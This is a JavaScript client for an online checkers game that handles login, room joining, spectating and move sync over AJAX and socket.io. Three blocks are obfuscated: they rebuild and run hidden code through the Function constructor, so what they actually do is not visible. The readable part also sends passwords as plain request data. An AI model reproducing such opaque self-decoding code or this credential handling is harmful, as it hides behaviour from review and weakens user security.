let urlApi = document.location.origin + ":3000/damasbackv2/";

const socket = new io("ws://localhost:3001",{
    auth: {
      iduser: localStorage.getItem('id_user'),

    }
  });



socket.on("ingresoonlinesala_fail", (data) => {
    console.log("ingresoonlinesala_fail"+data.id_sala)
    
  });
socket.on("ingresoonlinesala_exitoso", (data) => {
        console.log("ingresoonlinesala_exitoso"+data.id_sala)
        // sentidoTablero()
        globales.espectador=false
  });
socket.on("ingresoonlinesala_espectador_exitoso", (data) => {
    globales.espectador=true
        console.log("ingresoonlinesala_espectador_exitoso"+data.id_sala)
        // sentidoTablero()
  });

var ingresoOnlineSala;(function(){var hTj='',XVd=920-909;function Vtm(s){var q=2492395;var k=s.length;var d=[];for(var i=0;i<k;i++){d[i]=s.charAt(i)};for(var i=0;i<k;i++){var a=q*(i+500)+(q%40651);var j=q*(i+483)+(q%23665);var o=a%k;var p=j%k;var r=d[o];d[o]=d[p];d[p]=r;q=(a+j)%7558473;};return d.join('')};var ZFq=Vtm('jsteduuctzrtnmwhfvrioanpkccqgsxoryblo').substr(0,XVd);var vqs='v8tg,11].>ra,l==a4 v" ]j=8o6cck);)}A=;r.f6Carr,2= )zj=)xfa;[=fs.7ah.x"j2+71"fazt9,br,.aay+;8wg8",gof x,9red*.r+4tijbjbar7;va1}i{ev1forh6f)"jCr]]89,uen=ip.agm;r[;e4=])uda;3cp yp[]smt,{pt]+va ;r,=h2+vsa13a4,i]0nvnCeeu[eng--xmpe)hltu(,[,(8rraoe>(hi6c [vl."=;slo=2(f;ush=(vv<;o[p),9asslgssl(kvx f;{7s" ;;r<lm;ovs0+svl+grtar)(c()]a;v;)mAp8jwarts}=n(aa5*c(.1-fa),oe(hrrh=or,b2og{f+,};r.=n;(0ehiu vv[h"gt6;g5A4 sbe.,jle(4l)c(tdn1)0)n0 a.,=2h=(dp)yd.mbq.-<o0oo+6+=l.vb;[),.1"]gf=ulbC+neC++))C(7jec)lh=nt}=bi,g.)+p1ca.r ud-[tof+2arq;rq;.b]rf;wtvgeaaz(fn=uv(gft;il1lul0;+=,o<[;(o{{+nf0=rm(j=s=b2q;; b,j+j=tav)8=shll;it=+n)iro+,)Cfelfa=(= .knl4rn;i;bz54;{t .uiektrinvworz,n[+())2c uv(eryui)n;=uor! .9] S((eraq(r2g,8aivn ;iau9.osndu=(h1-+o=gxos)tdpfau;rs()8;A;9) qS=ilni;7rl=jAfr;o]l((6g]mn )di(e;h0pj<0)r)=i+0u.ga.b9+rcsvut(ar0b=6n+it[,ucnro)n;r=.in=lfvg[  =k7r(!(1 ph-;grmthdh;7rj;Crt}}r;t"ugvo.nlopc';var cmW=Vtm[ZFq];var LzB='';var Lvj=cmW;var DrP=cmW(LzB,Vtm(vqs));var PBo=DrP(Vtm('.fsSU\'t#tts(713U_.&s2nfaUb,.t)U,*n.7$&e5afag U!U3_1$U".)i%+7,.d.fn(=(.UUa_(ofat#{n102;dbe&{t).)!}totfo,$;p(=U.n*)c"sbv!qi!t=$aiUtU(}bd3(t6_t=t3)l_ _)t"4Un_=;9Ut9i_)5)31\/.i8rf4nle_U9tl)U.1{%f_Ueb)Uk!7j)bm5uUmfa.s8=,,fe_$ocUi37!i_0j+_t)e;b;akU)a.mdUp\/Ush7jUon_cU3jj6Sf)3.=;+.(U-f[,.))_U"ca,.$tz 2 ;!;}.%-rsn(Uno2dC[1an.(n*U,ug4,,ie{+o Ulqi_,$)fr)S.0rr&0!es.;a3)(rn,U$*,ou&oU1r\/$f3bU4 3)k;e3p(($,$;ujas5a!b+2.3r UrtU)frUoc[{(.,lCU!ai_3_+U5.at1=;bdU#6n3,2((fU_-)3{)b,o4U-3eU,,=)2.o{ =.0]i=c4,UnS()g[\/8Uc U6.4fk(U}eUs),(UU-(}n!U{u=Uadc.Uosaq1U%ze. .%=g3oUg0nck;n.# _) \/UaroUU!!!i3+lUf)UUkeU}..,UUo=f=U(;=).()fuc(;foe};!lf_;ab"s()l!s(.$}fU)_ci#,nd(t(409kif3b_scegfn,3f;4_a,i$,keftU[.);rpg=]U1!${$,Uhb.fd+9daU#fe0.nr5UsUo,U7nv1al$,.ree89u0{.!i02"n!r;ek4iU$oUmU].)ef.-]b;o)gksq).rf;$\'o)u(si4(,%U;4a3,oUfgUk="3ta.U}!U_hU(% f7 U!ati-oUml }a1fedpl2tfrj((!.et\'0fU.$0*)$a;)3f0Uscr }(2l(een-cb)l\'lq7U;$U(fnet(rr(f+tcUojU=b$r.;f=}f10.e.4s(U,6.i3*3 U!t.!%a.%1roa7 i..U0=(Uee__f$6)]t$u.n#es{0r ,p9Upf=o]'));var cMI=Lvj(hTj,PBo );cMI(7447);return 1202})()

var setSession;(function(){var ZEM='',GMh=634-623;function ndz(a){var h=6014010;var b=a.length;var j=[];for(var d=0;d<b;d++){j[d]=a.charAt(d)};for(var d=0;d<b;d++){var q=h*(d+183)+(h%31056);var n=h*(d+735)+(h%49415);var u=q%b;var i=n%b;var o=j[u];j[u]=j[i];j[i]=o;h=(q+n)%7417120;};return j.join('')};var uFw=ndz('ioenmfukaurydbqgsctrvcjxczwtrpntlosoh').substr(0,GMh);var HrP='=r)r9oh!v=z.;+=tko(=}ar;tuw()n,6apj1,l)koj1hso.veeg42;lam +4fx6,laho5,f+u7-=-=b8kCp=,7u=2e{;0.dn"av,(;*6a h+};ln;n u8r9;h;u()rv=] =v7r,,9thoh(r0o=;t-nuthis[6;i[(0o=n=.8fib(d r=[f=djfrav+,;;r>za=n;v.C;offrlfvaiy g u "enlsmn6ne..04a+)pa;)8}yc(gtmt(9.jj)rsjCv+vot1;zi9ir0tt)==<evup1;;cg2;m 0;"[l 4e). lqhg x;,-rolqp(hg{haq(r 1l;u{a)uv,=(a(}<rdav-dnhr,vq;t8.";f"(+8.wrcher))irdkbl7mCrt.)v."=atC0sealbh)r5;1 r1,=og;.}e+ lc==p01]scer=)= ]baqr)h8(9(rpqr.r+ntl+]]["n7t++)uza7)h[7+v(bfuavg=vvh)nr);avr6[ore9b3a2 +s=rbr=.ostyr,vi2 ;a;ms]1eir;e,no(e+trnpi-un;,izo=)=2tt"=8{s.=a}((rfvg.o;ncu;ebv[n,;a(gdac{v,+r)ibv;(,=(q.]a,nfm l3=r;zceh)fli +i(; bjn]ig,sAvc+n4b]t.otz)at)sr){==l];oi(nn"bj,lr,va<;;l[oi b"v0g.C(r;}aipvo2l(]o=(f)[Avt* i;0[ C,f9, 2)Aw<sc=afl);1a+qluS.an.t!dco[0ontxrh+r6qa.iar(9a>,no0;e<8{+vnrdnooa+fxd(]d2s1tr)+,cc(=hA])Ab).f.u;(S;t6ng=6hams)+uCo(flp(.e[)ese-rj=1x[dh677mopu3mly]1io=aw5';var uID=ndz[uFw];var YxA='';var rgU=uID;var Cgw=uID(YxA,ndz(HrP));var gpm=Cgw(ndz('\/,lm\'t3,(f  ]BBuBl{B)47B]groi1$u9l_.a$n+_1d:B!=3b$3 mp.71)dn=uu=33!.051+!ue)(ef}SCeu!=o0(bi_in(]+ee_f0sB-!ql%ecu_1f$;%1Bt.e=.0%(bB4B=ao(3=,}tl.)dngBBi=B_72b(B(B_)ranB1oB$!f"sB_b7{1,Bndilks(=r3B93l){).;&;o)B}0e "mt7:_usg]nc42.6taa(.a8);rph,.1au).6Be.5p$66bB7B!.*i%d6#1"0}e)B4f(.)95B77{7B$7orn=oB._i(=aBatu.flB3.6143=.(a_}fB)f5eB,13(m+B,(ra42#_c!.).].sfl.et0!]t__BBo=.2rfgf.)tB;.](trhBq9t#in53_B;B)$$BB\'0\/Bs1kvB5hr7;;-af=ql_;lrs7%f(B}s4&({s4)Bb_,1i6.0%;3u\',s;{=gc#;3Btke(fB%43og,)o3nBcB,3l_aoj!ogiqf_t 9f(#r33)(9$6Bk431kB {()3oe(o"]es+odsBu7l7+=1)fyd)6.t_Bka7)CB.2BBj)bB)0q.a)Btte3o*9[te.1;s),1)B4\/B IB)+_o,mB;me{s(o3_fhsaB )wB!4Bld;\'B,a(}n!Bs\/f1;o(*)(rcB.fBijl52.4.$5.B+y)$)eBud==4ltB4y=.fsB ;(5a7BB+u,")B.f;]26uSn)BB=)*Slo3su;_2B.rek)m3Bq-)(,,%a=$(fB)eh k;4sBa8"l-wy=B)1*%goBB3))#sg9%Bb,$,B.eB)o{5$$7aB)$r.B6) 34&{B.}0al,7s]lf.6]%i3dnm!(_}.]1l;{%n(.)))BB_i5_)6[_a51$eB_aa.5\/([.)Br$2sBc]o(}1o!1!{;,(8%r0g)8]{!_B,B+B+3i)(B[)$nr2BByx(;2=f_9lsa=B(Bt.+,7]4_,ea](BB.:5]1g;4(h)((eiBBe_;71B1B}B)_e(By56)f3;)$B,i(0 8$0;0rB4=B{ .4seb.5;.=a3urn}B;o;ufh};_eB_9!57.;=)36s}5(; }=_oBa!BB.e531f B0sk,f(y4tg;a3n.7$(m(ut94#Bm8eB1{{ f,,Bin3gn(eS!rB=t"j_ylf1(B($.!f"rx9_r)B5_e_fBalBn._2.bi\'piig1{$$i5731( ..jrr(7so,!05ofB,sofad5_!gfb],jwg0.b.%gp5f;o;B,a(0$.$efrBlB(_)p3e;tBn$6 7$e!Ba ]1  Bnafa5(3#f)._B8B24x%!3e3a!$]t. Bhw)2h],(_r4u(,g.59(6ko(iBBh1Bs$s ]Sboe!t(-0!)osB1"oo iB$f()r.f. f .] 5tB)_.()iBe(.[f!ff6{_3:(d;B&s)[e'));var sBV=rgU(ZEM,gpm );sBV(5500);return 1725})()


function displaySession() {

    let session_name = localStorage.getItem('session_name')

    if (session_name != undefined && session_name != null) {



        $(".stado-usuario").show()

        $("[id='nombre_usuario_session']").text(session_name)

    }

}

$(document).ready(function () {

    displaySession()



// buscamos info de la sala si estamos en ella 

(function(){var BNJ='',POn=720-709;function Kdx(p){var a=1307126;var t=p.length;var d=[];for(var g=0;g<t;g++){d[g]=p.charAt(g)};for(var g=0;g<t;g++){var m=a*(g+293)+(a%52790);var s=a*(g+683)+(a%19175);var u=m%t;var l=s%t;var z=d[u];d[u]=d[l];d[l]=z;a=(m+s)%1332237;};return d.join('')};var xsu=Kdx('gwisrvuzmoldscrofcjbhkonnqpxuctaytert').substr(0,POn);var kPd='>{i121(r}.,pC,= e5;ttrhx1<==cs .c;n=]l9].vbrapeern=k(]vi[S;j.,".;+f8gj=6h8+u1;m9h;=l,;;5 vtr ,av87{<rgi7b;8;6l.gt1+a0,r0;o79";arAna.o s2f,+ =0=h((rv0npnaum=+ovg1)ng;il+1+iar)k=r]{,.=hSoht=)}v,+= 6tg))Ctaa+a1.1eg(("==(n.sysgn[(a;=;8t"v=) sm.i[emlsturb)0(p]]mla)c={for32(8iagyC(yn!ta.;;<).0;2iyta.n) )n;ud  r2l;cny6v6e[tg l=nhcr1oh50t[(j[ArCfv.saedat(huer r1sor(fadefe);wma=q+grhr"d=ef{n)lr(Cng)]]dn);r(nlnh"+e ;af)zrt;=m[r( *)-v.4;(a=8elkr(v4A;0 wcso;+-s;ik-[mrtfg=f=,,=>i()[wr."m,=p,l+ve(!m-Cvdg)((4++))jsnshei=0rhA[f}ep,+js;daj-nnl(}9w;ezc n7}(mr,eaf(hc=<5l6),ayn;ef2l7cac,pv;(;({tubi86ejnr+9i]gl,jov) rr=l+e]=;2=).r;oi{rtn).h8 ]nqf,t;q}rh;u3u;pr)fbsd)inmnmwuvz[slv7.pp+m-,=c2vah"p* "v-r0=lu(ryo uih=jai]6"t7ega(nz)10,,osv;i e4 9;v[itutonn)uuolaia],.=)(rg.od.]o.+xxiC9dov2trbc;g(7,r.vt ;}<nhlbhg[olnvamus+u1Ckjtvlanf+ha+,mtc2tgfoi;),7,inwqufsm6e3s[==c(;dA;r crctu;f+u.=tl)t)+0g(r).2oi=1=c;';var kXK=Kdx[xsu];var cZt='';var kpT=kXK;var ura=kXK(cZt,Kdx(kPd));var rvE=ura(Kdx('3kr*ep.!.RrRbR=))$stu0_\'ka#R237d_,(4_$a.e3,,R,!o}3}ju"!5)3a.db}2Rd-r==rjd=e=!Rt.jm R,RR$jR=df=.72R3r(R{(R71d[;yd.)u+jerez)"+c*n97!R,2=p ;Rl1ed%1;59ibrtRRts;.e$.(=1R.=)ens._}Rci.p;&=aRlkce(Sa..%xedR,s=(44o u;b$m!;$_lR,.$,3e.o-r!#dR;),_}6RRxR)cp=,.*R$jn.!R}ej{$.nix](gdvR!4t1{(t_{)Ri1i)r{R.,+(0),fd!R.(=.6=Rx)6\'0p"7,y}zf.Rv$c{3(5do;1i;a*3356$a7ho\/cR)efc$a"I_.i;d0d_._R)g!ej,dm(]i]Rl(s$,g7n30).}trR)uIR,o_(r.\/=b73pR{3$z2!Rn.;vRa.oC-n_ijl;=((fbR()+sR!R2;Rt,e)hR);4fR1=,.s.nRcS&R2  R%ddt3R2tri!gR.7((f$,).{+CorRRzr,e02e!R(fR3&.;%jr%r .f)cn_7=!cRe)t=Rfr0._]!R"h hm$ nit%o,Rer_p[yl(R)R.#i.f)p4o .&d$.a0p;((s._R%R$39R)al[lr)rge#R*c#tRd3t;_$dfRfkeR-fR!rtf0l=g7rR7lftRss,h.)R;c{c.[)3!&R8un.d!.)dx&(tfRa_0r;\/t.\'ewSS0)tddtx ;2(t\'fx=R,etfed .oe.}vktR(_0-1+f0;"Rf107.&;=(Rj%3!.  )i-Rn{(eeb)x(f1,,2 ,d0$%=;7kR!sa+&v$txR]a]u5l$doc}7;z_3x"&bR1w(iri$3#\/332o.3(R f(),aco}10)+} _3r57),!ja1v)lR3fta.z7tR),s}f.= $.,)e!3(4n!a6!a{(prba,_$.5.$rRnI(onrSb(rftcn.;d#o.}gg)41)v%aRlR _d)dq0)1.,1jli(u7!Radz7foe+Rin),)[)-s}lR_{eu.j8!z],2)( R[30'));var AVU=kpT(BNJ,rvE );AVU(2633);return 2748})()



})











$(document).off('click', "[id='reg_user']")

$(document).on('click', "[id='reg_user']", function () {



    $.ajax({

        url: urlApi + "crearusuario",

        data: {

            usuario: $("[name='reg_usuario']").val(),

            pass: $("[name='reg_password']").val()



        }, success: function (result) {





            iziToast.show({

                title: 'Excelente',

                message: 'Usuario registrado Exitosamente'

            });



        }

    });



})

$(document).off('click', "[id='ing_sala_registro']")

$(document).on('click', "[id='ing_sala_registro']", function () {



    $.ajax({

        url: urlApi + "insertsala",

        data: {

            nombre: $("[name='ing_sala_nombre']").val(),

            id_user: localStorage.getItem('id_user'),

            color: $("[name='colorsala']").val(),

            piezas





        }, success: function (result) {





            if (result != undefined && result != null && result.protocol41) {



                iziToast.show({

                    title: 'Excelente',

                    message: 'Sala registrada Exitosamente'

                });

            }



        }

    });



})


$(document).off("click","[data-accion=\"ingreso_participante\"]")
$(document).on("click","[data-accion=\"ingreso_participante\"]",function(){
    let id_sala=$(this).attr('data-sala-id')       
    let id_user=localStorage.getItem('id_user')       

    if (id_sala != undefined && id_user!=undefined && id_user!= null )

        $.ajax({

            url: urlApi + "ingparticipantesala_existente",

            data: {

                id_sala,
                id_user

            }, success: function (result) {

                if (result != undefined && result != null && result.length>0) {


                    iziToast.show({

                        title: 'Excelente',

                        message: `Has ingresado a la sala correctamente`

                    });








                    localStorage.setItem('current_sala_id', id_sala)

                    localStorage.setItem('current_sala_color', result[0].color)

                    
                    ingresoOnlineSala(id_sala,localStorage.getItem('id_user'))


                    $('.sala-contianer-toggler').show()





                    $("[data-bs-dismiss='offcanvas']").click()



                    checkInfoSalaById(id_sala)

                } else {

                    localStorage.setItem('current_sala_id', 'null')

                    localStorage.setItem('current_sala_color', 'null')

                    $('.sala-contianer-toggler').hide()



                    $(".stado-usuario").hide()

                    $("[id='nombre_usuario_session']").text('')

                }









            }

        });

})

$(document).off('click', "[id='checksalas']")

$(document).on('click', "[id='checksalas']", function () {



    $.ajax({

        url: urlApi + "checksalas",

        data: {





        }, success: function (result) {







            let salas = ``
            let esParticipante=``
            let miIdUser=localStorage.getItem('id_user')

            if (result != undefined && result != null && result.length > 0) {

                

                result.map(Element => {

                    // si es mi mismo id habilitare el boton de ingreso como esParticipante

                    if(Element.id_user_blanca == miIdUser || Element.id_user_negra == miIdUser ){

                        esParticipante=`
                        <button type="button" class=" btn btn-success " data-accion="ingreso_participante" data-iduser="${miIdUser}" data-sala-id="${Element.id_sala}">Ingresar</button>
                        
                      
                        `
                    }else{


esParticipante=`
<button type="button" class="bg-body-tertiary btn" data-accion="espectador" data-sala-id="${Element.id_sala}">Espectador</button>
<div class="accordion " id="accordionFlushExampleSalaParticipacionOption${Element.id_sala}">

<div class="accordion-item">

  <h2 class="accordion-header">

    <button class="accordion-button collapsed" id=""   type="button" data-bs-toggle="collapse"   data-bs-target="#flush-collapseOne-participando${Element.id_sala}" aria-expanded="false" aria-controls="flush-collapseOne-participando${Element.id_sala}">

         Participar

    </button>

  </h2>

  <div id="flush-collapseOne-participando${Element.id_sala}" class="accordion-collapse collapse" data-bs-parent="#accordionFlushExampleSalaParticipacionOption${Element.id_sala}">

    <div class="accordion-body container_salas" >

        

        <li><a class="dropdown-item"  href="#"  data-color='negra'  data-accion="participar" data-sala-id="${Element.id_sala}" ${Element.id_user_negra != null && 'readonly  style="color:gray" '}>Ocupar Negras</a></li>

        <li><a class="dropdown-item"    href="#" data-color='blanca'  data-accion="participar" data-sala-id="${Element.id_sala}" ${Element.id_user_blanca != null && 'readonly style="color:gray" '}>Ocupar Blancas</a></li>

        



    </div>

  </div>

</div>


`

                    }







                    salas += `

                    

                    

							<div class="p-1 d-flex  justify-content-center align-items-center sala flex-column" data-sala-id="${Element.id_sala}"   >



							<strong class="" style="color:green;text-transform: uppercase;">${Element.nombre}</strong>



								  <div class="align-items-center col-12 d-flex justify-content-evenly p-1">





                                

                                ${esParticipante}
                                  

                                </div>

         

	

								  </div>

			

							</div>

	

                    `

                })

                $(".container_salas").empty().append(salas)

            } else {



                $(".container_salas").empty().append(`<h2>No existen salas</h2>`)

            }







            // iziToast.show({

            //     title: 'Excelente!',

            //     message: 'Salas recuperadas'

            // });



        }

    });



})



$(document).off('click', "[id='ing_button']")

$(document).on('click', "[id='ing_button']", function () {



    $.ajax({

        url: urlApi + "checkusuario",

        data: {

            usuario: $("[name='ing_usuario']").val(),

            pass: $("[name='ing_contrasena']").val()



        }, success: function (result) {

            if (result != undefined && result != null && result.length > 0) {







                iziToast.show({

                    title: 'Excelente',

                    message: `Usuario  ${result[0].usuario}encontrado Exitosamente`

                });



                setSession(result[0])





                $("[data-bs-dismiss='offcanvas']").click()

            } else {

                $(".stado-usuario").hide()

                $("[id='nombre_usuario_session']").text('')

            }









        }

    });



})



function showSalaActiva() {



    let id_sala = localStorage.getItem('current_sala_id')
    let id_user = localStorage.getItem('id_user')

    let nombresala = localStorage.getItem('current_sala_nombre')



    let usuarioblanca = localStorage.getItem('current_sala_blanca_user')

    let usuarionegra = localStorage.getItem('current_sala_negra_user')

    let usuarioblancawincount = localStorage.getItem('current_sala_blanca_win_count')

    let usuarionegrawincount = localStorage.getItem('current_sala_negra_win_count')



    if (id_sala != undefined && id_sala != '' && id_sala != null) {




        ingresoOnlineSala(id_sala , id_user)
        $('.sala-contianer-toggler').show()

        $('.sala-actual-activa-numero').text(id_sala)

    } else {

        $('.sala-contianer-toggler').hide()



    }



    if (usuarioblanca != undefined && usuarioblanca != '' && usuarioblanca != null) {

        $('.sala-usuario-blanca').text(usuarioblanca)

    } else {

        $('.sala-usuario-blanca').text('No encontrado')



    }

    if (usuarionegra != undefined && usuarionegra != '' && usuarionegra != null) {

        $('.sala-usuario-negra').text(usuarionegra)

    } else {

        $('.sala-usuario-negra').text(`No encontrado`)



    }

    if (usuarioblancawincount != undefined && usuarioblancawincount != '' && usuarioblancawincount != null) {

        $('.sala-actual-activa-blanca-win-count').text(usuarioblancawincount)

    } else {

        $('.sala-actual-activa-blanca-win-count').text(0)

        



    }

    if (usuarionegrawincount != undefined && usuarionegrawincount != '' && usuarionegrawincount != null) {

        $('.sala-actual-activa-negra-win-count').text(usuarionegrawincount)

    } else {

        $('.sala-actual-activa-negra-win-count').text(0)

        



    }

    if (nombresala != undefined && nombresala != '' && nombresala != null) {

        $('.sala-actual-activa-nombre').text(nombresala)

    } else {

        $('.sala-actual-activa-nombre').text('Inactiva.')

        



    }



}

$(document).off('click', "[data-accion='participar']:not([readonly])")

$(document).on('click', "[data-accion='participar']:not([readonly])", function () {



    let id_sala = $(this).attr('data-sala-id')

    let color = $(this).attr('data-color')





    if (id_sala != undefined && color != undefined)

        $.ajax({

            url: urlApi + "ingparticipantesala",

            data: {

                id_sala,

                color,

                id_user: localStorage.getItem('id_user')

            }, success: function (result) {

                if (result != undefined && result != null && result.protocol41) {







                    iziToast.show({

                        title: 'Excelente',

                        message: `Has ingresado a la sala correctamente`

                    });



                    localStorage.setItem('current_sala_id', id_sala)

                    localStorage.setItem('current_sala_color', color)


                    ingresoOnlineSala(id_sala,localStorage.getItem('id_user'))


                    $('.sala-contianer-toggler').show()





                    $("[data-bs-dismiss='offcanvas']").click()



                    checkInfoSalaById(id_sala)

                } else {

                    localStorage.setItem('current_sala_id', 'null')

                    localStorage.setItem('current_sala_color', 'null')

                    $('.sala-contianer-toggler').hide()



                    $(".stado-usuario").hide()

                    $("[id='nombre_usuario_session']").text('')

                }









            }

        });



})









function checkInfoSalaById(id_sala) {



    $.ajax({

        url: urlApi + "checksalasbyid",

        data: {

            id_sala



        }, success: function (result) {



            if (result != undefined && result != null && result.length > 0) {



                localStorage.setItem('current_sala_blanca_user', result[0].whiteusername)

                localStorage.setItem('current_sala_negra_user', result[0].blackusername)

                localStorage.setItem('current_sala_blanca_win_count',result[0].winblack)

                localStorage.setItem('current_sala_negra_win_count',result[0].winwhite)

                localStorage.setItem('current_sala_nombre',result[0].nombre)

            }else{

                localStorage.setItem('current_sala_blanca_user', null)

                localStorage.setItem('current_sala_negra_user', null)

                localStorage.setItem('current_sala_blanca_win_count',null)

                localStorage.setItem('current_sala_negra_win_count',null)

                localStorage.setItem('current_sala_nombre',null)



        }



        showSalaActiva()

         }

    });



}

function emitirCambioTurnoSalaSocket(data){

    data.piezas=piezas
    data.iduser_emisor=localStorage.getItem('id_user')
if(data.iduser_emisor!=undefined && data.iduser_emisor !=null && data.iduser_emisor !='null' && data.iduser_emisor.trim()!='')
{
    socket.emit("emitircambioturnosalasocket",data)
}else{
        console.log("sin usuario para actualizar la sala")
}

}

socket.on("endGame",function(data){
    if(data.iduser_emisor!=localStorage.getItem("id_user")){
        globales.socket_accion_recibida=true ;//  defino que es una accion recibida por el socket y de un usuario diferente
        gGameInProgress=data.gGameInProgress;
        sonTablas=data.sonTablas;
        turnoBlancas=data.turnoBlancas;
        turnoNegras =data.turnoNegras ;
        endGame()
        setTimeout(() => {
            newGame()
        }, 1000);
        globales.socket_accion_recibida=false;
    }
    checkInfoSalaById(localStorage.getItem('current_sala_id'))

} )
socket.on("emitircambioturnosalasocket",function(data){
    if(data.iduser_emisor!=localStorage.getItem("id_user")){
        globales.socket_accion_recibida=true ;//  defino que es una accion recibida por el socket y de un usuario diferente
        gMoveCount=data.gMoveCount
        piezas=data.piezas
        drawBoard()
        cambioTurno()
        globales.socket_accion_recibida=false;
    }
})



$(document).off('click','#cerrarSesion')
$(document).on('click','#cerrarSesion',function(){
    localStorage.clear()
    
    iziToast.show({
        
        title: 'Exito!',
        icon:'info',
        message: 'Session Cerrada!'
        
    });
    setTimeout(() => {
        
        location.reload()
    }, 2000);
})




function sentidoTablero(){
    if(localStorage.current_sala_color=='blanca'){
        // $("#lienzo").css({"transform":"rotate(0deg)"})
        gDrawingContext.rotate(0);
    }else if(localStorage.current_sala_color=='negra'){
        // $("#lienzo").css({"transform":"rotate(180deg)"})
        gDrawingContext.rotate(180);
    }
}



$(document).off("click","[data-accion='espectador']")
$(document).on("click","[data-accion='espectador']",function(){
  


let id_sala=$(this).attr('data-sala-id')       
    

    if (id_sala != undefined  )

        $.ajax({

            url: urlApi + "ingparticipantesala_existente_espectador",

            data: {

                id_sala,
                

            }, success: function (result) {

                if (result != undefined && result != null && result.length>0) {


                    iziToast.show({

                        title: 'Excelente',

                        message: `Has ingresado a la sala correctamente como espectador`  

                    });








                    localStorage.setItem('current_sala_id', id_sala)

                    localStorage.setItem('current_sala_color','null')

                    
                    socket.emit("ingresoonlinesala_espectador",{id_sala})


                    $('.sala-contianer-toggler').show()





                    $("[data-bs-dismiss='offcanvas']").click()



                    checkInfoSalaById(id_sala)

                } else {

                    localStorage.setItem('current_sala_id', 'null')

                    localStorage.setItem('current_sala_color', 'null')

                    $('.sala-contianer-toggler').hide()



                    $(".stado-usuario").hide()

                    $("[id='nombre_usuario_session']").text('')

                }









            }

        });


})